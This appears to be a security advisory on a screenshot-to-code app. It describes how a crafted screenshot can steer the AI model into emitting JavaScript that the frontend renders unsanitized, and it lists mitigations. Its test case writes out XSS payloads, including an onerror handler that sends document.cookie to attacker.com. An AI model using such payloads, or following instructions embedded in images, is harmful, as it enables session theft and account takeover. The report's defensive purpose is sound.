### Vulnerability List

* Vulnerability Name: Cross-Site Scripting (XSS) via AI-Generated Code

* Description:
    1. An attacker uploads a specially crafted screenshot to the application.
    2. The backend processes this screenshot using an AI model to generate HTML, CSS, and JavaScript code.
    3. The malicious screenshot is designed to induce the AI model to include malicious JavaScript code within the generated output. For example, the screenshot could depict UI elements with embedded JavaScript event handlers or text content that, when interpreted as code, executes JavaScript.
    4. The backend sends the AI-generated code, including the malicious JavaScript, to the frontend.
    5. The frontend receives this code and renders it in the user's browser, typically within an iframe or a similar mechanism to display the generated output.
    6. Because the generated code contains malicious JavaScript and is rendered directly without sanitization, the JavaScript code executes in the context of the user's browser session.
    7. This allows the attacker to perform actions such as stealing cookies, session tokens, or other sensitive information; redirecting the user to malicious websites; or performing actions on behalf of the user.

* Impact:
    - Account Takeover: Attacker can steal session cookies or tokens, leading to account hijacking.
    - Data Breach: Access to sensitive user data within the application.
    - Malicious Actions: Attacker can perform actions on behalf of the user, such as modifying data, initiating transactions, or spreading malware.
    - Website Defacement: Injecting code to alter the visual appearance of the application for other users.

* Vulnerability Rank: High

* Currently Implemented Mitigations:
    - Based on the provided files, there is no evidence of implemented sanitization or Content Security Policy (CSP) to mitigate XSS vulnerabilities in the AI-generated code. The backend code (`codegen/utils.py`) focuses on extracting HTML content but does not include any sanitization steps. The LLM interaction code (`llm.py` which is used by `generate_code.py`) also directly streams and returns the generated code without modification. The `evals.py` route also reads HTML files and serves them without sanitization, although this route's exposure and purpose in a real attack scenario is less direct than the main code generation flow.

* Missing Mitigations:
    - Input Sanitization: The backend should sanitize the AI-generated code before sending it to the frontend. This involves parsing the generated HTML, CSS, and JavaScript and removing or neutralizing any potentially malicious code, especially JavaScript. Libraries like DOMPurify (for JavaScript) or similar server-side HTML sanitizers should be used.
    - Content Security Policy (CSP): Implement a strict CSP header to control the resources the browser is allowed to load and prevent the execution of inline JavaScript. This should be configured on the server to restrict script sources and other potentially dangerous behaviors.
    - Output Encoding: Ensure that when the generated code is rendered on the frontend, it is properly encoded to prevent interpretation as executable code. However, for HTML rendering, sanitization is more critical than output encoding in preventing XSS.
    - Regular Security Audits and Penetration Testing: Conduct regular security assessments, including penetration testing specifically targeting XSS vulnerabilities in the AI-generated code functionality.

* Preconditions:
    - The attacker needs to be able to upload a screenshot (or video, which is processed into screenshots as seen in `video/utils.py`) to the application.
    - The application must use an AI model to generate code from the screenshot.
    - The frontend must render the AI-generated code in a user's browser.
    - There must be no sanitization of the AI-generated code before rendering in the frontend.

* Source Code Analysis:
    - `backend\codegen\utils.py`:
        ```python
        import re

        def extract_html_content(text: str):
            # Use regex to find content within <html> tags and include the tags themselves
            match = re.search(r"(<html.*?>.*?</html>)", text, re.DOTALL)
            if match:
                return match.group(1)
            else:
                # Otherwise, we just send the previous HTML over
                print(
                    "[HTML Extraction] No <html> tags found in the generated content: " + text
                )
                return text
        ```
        - The `extract_html_content` function in `codegen/utils.py` is used in `generate_code.py` to process the output from the LLM. It uses a regular expression to extract HTML content from the text generated by the AI model.
        - **Vulnerability Point:** This function does not perform any sanitization of the extracted HTML. It simply extracts the content and returns it. If the AI model generates malicious JavaScript within the HTML, this function will pass it through without modification.

    - `backend\llm.py`:
        - This file (used by `generate_code.py`) contains functions (`stream_openai_response`, `stream_claude_response`, `stream_claude_response_native`, `stream_gemini_response`) that interact with different LLMs (OpenAI, Claude, Gemini).
        - These functions are responsible for sending prompts to the AI models and streaming back the generated responses.
        - **Vulnerability Point:** These functions handle the raw output from the LLMs. They do not include any code that would sanitize or inspect the generated text for malicious content before returning it to the application. The callback mechanism in `stream_openai_response` and `stream_claude_response` is for streaming the output, not for sanitization.

    - `backend\routes\generate_code.py`:
        - This file sets up a WebSocket endpoint `/generate-code` using FastAPI. It handles the code generation process.
        - It calls `extract_html_content` to process the LLM's response before sending it to the frontend.
        - **Vulnerability Point:** The generated code, after being processed by `extract_html_content` (which does not sanitize), is sent directly to the frontend via WebSocket without any sanitization. This confirms the XSS vulnerability path.

    - `backend\main.py` and other backend files (e.g., `evals.py`, `screenshot.py`, `video/utils.py`, `home.py`, `ws/constants.py`):
        - Reviewing these files, there is no indication of any sanitization logic being implemented in the backend before sending the generated code to the frontend.  Files like `evals.py` further highlight the lack of sanitization as they process and serve HTML files directly.

    - **Frontend Code (Not provided in this batch, but assumed based on project description):**
        - It is assumed that the frontend (React application) receives the HTML code from the backend API and renders it within a component, possibly using `dangerouslySetInnerHTML` in React or similar methods for other frameworks.
        - **Vulnerability Point:** If the frontend renders the received HTML directly without sanitization, it will execute any JavaScript code embedded within it, leading to XSS.

    - **Visualization:**

    ```
    [Attacker Uploads Malicious Screenshot] --> [Backend API Endpoint (/generate-code via WebSocket)] --> [AI Model (LLM)] --> [Generates HTML with Malicious JS] --> [Backend Calls extract_html_content (NO SANITIZATION)] --> [Backend Returns Malicious HTML] --> [Frontend Receives Malicious HTML] --> [Frontend Renders HTML (Vulnerable Point: No Sanitization)] --> [Malicious JS Executes in User Browser] --> [XSS Vulnerability Triggered]
    ```

* Security Test Case:
    1. **Prepare a Malicious Screenshot:** Create a screenshot that, when processed by the AI, is likely to generate HTML code containing malicious JavaScript. For example, the screenshot could subtly include text that, when interpreted as HTML, forms a JavaScript injection. A simple example could be a text input field label that looks like "Enter name <img src=x onerror=alert('XSS')>". When the AI transcribes this and generates HTML, it might include the `<img>` tag directly.
    2. **Upload the Screenshot:** Access the application through a web browser and use the screenshot upload functionality to upload the malicious screenshot created in step 1.
    3. **Trigger Code Generation:** Initiate the process of generating code from the uploaded screenshot. This typically involves clicking a "Generate Code" button or similar action in the application's frontend.
    4. **Inspect the Rendered Output:** Once the code generation is complete, examine the rendered output in the frontend. Look for signs of JavaScript execution. In our example, a successful XSS would result in an alert box popping up in the browser with the text "XSS".
    5. **Verify Cookie Stealing (Advanced):** For a more advanced test, modify the malicious JavaScript in the screenshot to attempt to steal cookies or session storage and send them to an attacker-controlled server. For example, use `<img src=x onerror="fetch('https://attacker.com/collect?cookie=' + document.cookie)">`. Use browser developer tools or network monitoring tools to check if a request is sent to `attacker.com` with the user's cookies after rendering the generated code.
    6. **Expected Result:** If the application is vulnerable, the JavaScript code injected via the malicious screenshot will execute in the browser when the generated code is rendered. You should observe the alert box (or cookie exfiltration in the advanced test), confirming the XSS vulnerability. If no alert box appears and no cookie exfiltration occurs, the application might have some form of mitigation, or the screenshot might not have been crafted effectively to trigger the vulnerability with the current AI model and prompts. Repeat with different screenshot variations if the initial test fails.
